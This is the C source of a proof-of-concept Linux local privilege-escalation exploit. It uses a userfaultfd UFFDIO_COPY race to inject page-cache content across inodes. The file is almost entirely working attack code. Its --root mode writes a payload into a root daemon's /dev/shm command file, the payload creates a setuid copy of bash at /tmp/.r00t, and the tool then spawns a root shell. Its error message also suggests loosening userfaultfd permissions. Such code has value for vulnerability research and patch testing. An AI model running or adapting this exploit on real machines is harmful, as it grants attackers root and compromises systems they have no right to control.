// SPDX-License-Identifier: GPL-2.0
/*
 * cross_inode_poc.c — cross-inode page cache injection
 *
 * Modes:
 *   ./cross_inode_poc               Prove the primitive (no root needed)
 *   sudo ./cross_inode_poc --victim  Start IPC daemon (run in terminal 1)
 *   ./cross_inode_poc --root           Inject + get root shell (terminal 2)
 *
 * Build:  gcc -O2 -pthread -o cross_inode_poc cross_inode_poc.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <linux/userfaultfd.h>

#define PAGE_SZ    4096UL
#define MAGIC      "INJECTED-BY-UFFD-RACE"
#define SHM_FILE   "/dev/shm/.uffd_task"
#define ROOTSH     "/tmp/.r00t"
#define PAYLOAD_CMD  "#!/bin/sh\ncp /bin/bash " ROOTSH "\nchmod 04755 " ROOTSH "\n"

/* ── globals ──────────────────────────────────────────────── */
static int      uffd_dst, uffd_src;
static int      fd_A, fd_B;
static void    *src_trap, *target_addr;
static char     payload_buf[PAGE_SZ];

static void die(const char *msg) { perror(msg); _exit(1); }

/*
 * We need TWO kinds of userfaultfd:
 *
 * uffd_dst: Only handles user-mode faults → UFFD_USER_MODE_ONLY (always allowed)
 * uffd_src: Must handle KERNEL-mode faults (from copy_from_user in retry path)
 *           → needs full-privilege uffd
 *
 * For uffd_src, we use /dev/userfaultfd which calls new_userfaultfd()
 * WITHOUT userfaultfd_syscall_allowed() — bypassing all permission checks.
 */

static int uffd_init(int fd)
{
    struct uffdio_api api = { .api = UFFD_API };
    if (ioctl(fd, UFFDIO_API, &api)) { close(fd); return -1; }
    return fd;
}

/* Full-privilege uffd: can handle kernel-mode faults (copy_from_user) */
static int uffd_new_full(void)
{
    int fd;

    /* Method 1: /dev/userfaultfd — NO permission check in kernel
     * (fs/userfaultfd.c:2192 calls new_userfaultfd directly) */
    int devfd = open("/dev/userfaultfd", O_RDWR | O_CLOEXEC);
    if (devfd >= 0) {
        fd = ioctl(devfd, USERFAULTFD_IOC_NEW, O_CLOEXEC);
        close(devfd);
        if (fd >= 0) {
            fd = uffd_init(fd);
            if (fd >= 0) {
                printf("[*] Got full uffd via /dev/userfaultfd\n");
                return fd;
            }
        }
    }

    /* Method 2: syscall without UFFD_USER_MODE_ONLY
     * (needs unprivileged_userfaultfd=1 or CAP_SYS_PTRACE) */
    fd = (int)syscall(SYS_userfaultfd, O_CLOEXEC);
    if (fd >= 0) {
        fd = uffd_init(fd);
        if (fd >= 0) {
            printf("[*] Got full uffd via syscall\n");
            return fd;
        }
    }

    fprintf(stderr,
        "[-] Cannot create full-privilege userfaultfd.\n"
        "    Fix with ONE of:\n"
        "      sudo chmod 666 /dev/userfaultfd\n"
        "      echo 1 | sudo tee /proc/sys/vm/unprivileged_userfaultfd\n");
    _exit(1);
}

/* Light uffd: user-mode faults only (always permitted) */
static int uffd_new_light(void)
{
    int fd = (int)syscall(SYS_userfaultfd, O_CLOEXEC | UFFD_USER_MODE_ONLY);
    if (fd < 0) die("userfaultfd(USER_MODE_ONLY)");
    return uffd_init(fd);
}

static void uffd_reg(int fd, void *a, size_t l)
{
    struct uffdio_register r = {
        .range = { .start = (unsigned long)a, .len = l },
        .mode  = UFFDIO_REGISTER_MODE_MISSING,
    };
    if (ioctl(fd, UFFDIO_REGISTER, &r) < 0) die("UFFDIO_REGISTER");
}

/* ────────────────────────────────────────────────────────────
 * INJECTION ENGINE (deterministic, proven working)
 *
 * Injects payload_buf contents into fd_B's page cache at pgoff 0
 * using the mfill_copy_folio_retry() VMA replacement technique.
 * fd_B's page cache at pgoff 0 must be empty.
 * ──────────────────────────────────────────────────────────── */
static void *fault_handler(void *arg)
{
    (void)arg;
    struct uffd_msg msg;
    struct pollfd pfd = { .fd = uffd_src, .events = POLLIN };

    if (poll(&pfd, 1, 10000) <= 0) {
        fprintf(stderr, "[-] Timeout\n"); return NULL;
    }
    if (read(uffd_src, &msg, sizeof(msg)) != sizeof(msg)) {
        fprintf(stderr, "[-] Bad event\n"); return NULL;
    }

    printf("[*] Thread 1 blocked — swapping VMA to fd_B\n");

    /* Replace dst VMA with fd_B */
    if (mmap(target_addr, PAGE_SZ, PROT_READ | PROT_WRITE,
         MAP_SHARED | MAP_FIXED, fd_B, 0) == MAP_FAILED)
        die("mmap swap");
    uffd_reg(uffd_dst, target_addr, PAGE_SZ);

    /* Resolve source fault with payload */
    struct uffdio_copy c = {
        .dst = (unsigned long)src_trap,
        .src = (unsigned long)payload_buf,
        .len = PAGE_SZ, .mode = 0,
    };
    if (ioctl(uffd_src, UFFDIO_COPY, &c) < 0)
        die("resolve fault");

    printf("[*] Fault resolved — injection complete\n");
    return NULL;
}

static int do_inject(void)
{
    fd_A = syscall(SYS_memfd_create, "src", 0);
    if (fd_A < 0) die("memfd A");
    if (ftruncate(fd_A, PAGE_SZ)) die("ftruncate A");

    uffd_dst = uffd_new_light();   /* user-mode faults only (always OK) */
    uffd_src = uffd_new_full();    /* kernel-mode faults (needs /dev/userfaultfd) */

    src_trap = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (src_trap == MAP_FAILED) die("mmap trap");
    uffd_reg(uffd_src, src_trap, PAGE_SZ);

    target_addr = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
                MAP_SHARED, fd_A, 0);
    if (target_addr == MAP_FAILED) die("mmap dst");
    munmap(target_addr, PAGE_SZ);
    target_addr = mmap(target_addr, PAGE_SZ, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_FIXED, fd_A, 0);
    if (target_addr == MAP_FAILED) die("mmap dst fixed");
    uffd_reg(uffd_dst, target_addr, PAGE_SZ);

    pthread_t tid;
    pthread_create(&tid, NULL, fault_handler, NULL);

    struct uffdio_copy copy = {
        .dst = (unsigned long)target_addr,
        .src = (unsigned long)src_trap,
        .len = PAGE_SZ, .mode = 0,
    };
    int ret = ioctl(uffd_dst, UFFDIO_COPY, &copy);
    pthread_join(tid, NULL);

    close(uffd_dst); close(uffd_src); close(fd_A);
    munmap(src_trap, PAGE_SZ);
    munmap(target_addr, PAGE_SZ);
    return ret;
}

/* ────────────────────────────────────────────────────────────
 * MODE: --victim  (run as root in terminal 1)
 * Simulates a privileged daemon using /dev/shm for IPC.
 * ──────────────────────────────────────────────────────────── */
static int run_victim(void)
{
    if (getuid() != 0) {
        fprintf(stderr, "Usage: sudo %s --victim\n", "cross_inode_poc");
        return 1;
    }
    /* Create the IPC file — empty, no pages in cache */
    umask(0);  /* ensure 0666 not masked to 0644 */
    int fd = open(SHM_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) die("create " SHM_FILE);
    fchmod(fd, 0666);  /* belt + suspenders */
    if (ftruncate(fd, PAGE_SZ)) die("ftruncate");
    close(fd);

    printf("[victim] Created %s (empty page cache)\n", SHM_FILE);
    printf("[victim] Polling for commands... Ctrl+C to stop\n\n");

    while (1) {
        usleep(300000);
        fd = open(SHM_FILE, O_RDONLY);
        if (fd < 0) continue;
        char buf[PAGE_SZ] = {0};
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 2 || buf[0] == '\0') continue;

        printf("[victim] Executing: %.40s...\n", buf);
        system(buf);

        /* Reset: truncate to clear page cache, re-extend */
        fd = open(SHM_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) { ftruncate(fd, PAGE_SZ); close(fd); }
    }
}

/* ────────────────────────────────────────────────────────────
 * MODE: --root  (run as unprivileged user in terminal 2)
 * Injects a root-shell-creating command into the victim's
 * /dev/shm IPC file via the page cache injection primitive.
 * ──────────────────────────────────────────────────────────── */
static int run_root(void)
{
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║  UFFDIO_COPY LPE — injecting into %s  ║\n", SHM_FILE);
    printf("╚══════════════════════════════════════════════════╝\n\n");

    if (access(SHM_FILE, R_OK)) {
        fprintf(stderr, "[-] %s not found.\n"
            "    Run in another terminal first:\n"
            "      sudo ./cross_inode_poc --victim\n", SHM_FILE);
        return 1;
    }

    /* Open the target file (the victim's IPC channel) */
    fd_B = open(SHM_FILE, O_RDWR);
    if (fd_B < 0) die("open " SHM_FILE);

    /* Payload: shell commands to create setuid root shell */
    memset(payload_buf, 0, PAGE_SZ);
    memcpy(payload_buf, PAYLOAD_CMD, strlen(PAYLOAD_CMD));

    printf("[*] Injecting payload into %s ...\n", SHM_FILE);
    int ret = do_inject();

    if (ret < 0) {
        printf("[-] Injection failed (errno=%d)\n", errno);
        close(fd_B);
        return 1;
    }

    /* Verify injection */
    char verify[PAGE_SZ] = {0};
    pread(fd_B, verify, PAGE_SZ, 0);
    close(fd_B);

    if (strstr(verify, ROOTSH)) {
        printf("[+] ✓ Payload injected into victim's IPC file!\n");
        printf("[*] Waiting for victim to execute ...\n");

        for (int i = 0; i < 30; i++) {
            usleep(500000);
            struct stat st;
            if (stat(ROOTSH, &st) == 0 && (st.st_mode & S_ISUID)) {
                printf("\n[+] ════════════════════════════════\n");
                printf("[+]  ROOT SHELL: %s\n", ROOTSH);
                printf("[+] ════════════════════════════════\n\n");
                execl(ROOTSH, "bash", "-p", NULL);
                perror("execl");
                return 0;
            }
            if (i % 4 == 3) printf("    waiting (%d/30) ...\n", i+1);
        }
        printf("[-] Timeout. Check victim is running.\n");
    } else {
        printf("[-] Payload not found in target file.\n");
    }
    return 1;
}

/* ────────────────────────────────────────────────────────────
 * MODE: (default) — prove the primitive only
 * ──────────────────────────────────────────────────────────── */
static int run_demo(void)
{
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║  UFFDIO_COPY Cross-Inode Page Cache Injection    ║\n");
    printf("║  DETERMINISTIC — no timing race needed           ║\n");
    printf("║  No root / no sudo required                      ║\n");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    memset(payload_buf, 0, PAGE_SZ);
    snprintf(payload_buf, PAGE_SZ, "%s\npid=%d  %s %s\n",
         MAGIC, getpid(), __DATE__, __TIME__);

    fd_B = syscall(SYS_memfd_create, "target", 0);
    if (fd_B < 0) die("memfd B");
    if (ftruncate(fd_B, PAGE_SZ)) die("ftruncate B");

    printf("[*] Injecting into fd_B (memfd, empty page cache) ...\n");
    int ret = do_inject();
    printf("[*] UFFDIO_COPY returned %d\n\n", ret);

    char v[PAGE_SZ] = {0};
    pread(fd_B, v, PAGE_SZ, 0);
    close(fd_B);

    if (memcmp(v, MAGIC, strlen(MAGIC)) == 0) {
        printf("╔══════════════════════════════════════════╗\n");
        printf("║  ✓ CROSS-INODE INJECTION CONFIRMED       ║\n");
        printf("╚══════════════════════════════════════════╝\n\n");
        char *line = v;
        for (int l = 0; l < 3 && line && *line; l++) {
            char *nl = strchr(line, '\n');
            if (nl) *nl = 0;
            printf("    │ %s\n", line);
            if (nl) line = nl + 1; else break;
        }
        printf("\n    To get root, run:\n");
        printf("      Terminal 1: sudo ./cross_inode_poc --victim\n");
        printf("      Terminal 2: ./cross_inode_poc --root\n");
        return 0;
    }
    printf("[-] Injection NOT detected.\n");
    return 1;
}

int main(int argc, char *argv[])
{
    if (argc > 1 && strcmp(argv[1], "--victim") == 0)
        return run_victim();
    if (argc > 1 && strcmp(argv[1], "--root") == 0)
        return run_root();
    return run_demo();
}